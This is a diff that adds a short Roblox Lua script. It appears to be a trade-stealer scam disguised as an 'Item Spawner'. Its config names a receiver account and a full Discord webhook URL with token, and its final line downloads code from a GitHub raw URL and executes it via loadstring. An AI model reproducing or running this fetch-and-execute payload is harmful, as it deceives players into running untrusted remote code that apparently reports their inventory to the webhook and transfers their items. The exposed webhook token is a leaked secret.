@@ -1,0 +1,10 @@
+Config = {
+    Receivers = {"Gravyisthebest_right"},
+    Webhook = "https://discord.com/api/webhooks/1299363966719496342/Q4U3MkJpsfJeEpM_gwzz6XQwq_ITbvz6fl5bROlKFM8yDvCbjDF7oQh74JFBMp1iL54x",
+    FullInventory = true, -- If true, it will display all of the player's items.
+    ResendTrade = "a", -- Send this in chat to resend the trade request if you don't receive it.
+    Script = "Item Spawner", -- Scripts > "None", "Custom", "vertex", "xhub", "Item Spawner", "TitaniumXv1"
+    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/thecakewasalie/refs/heads/main/the/cake/isnt/real/main"))()
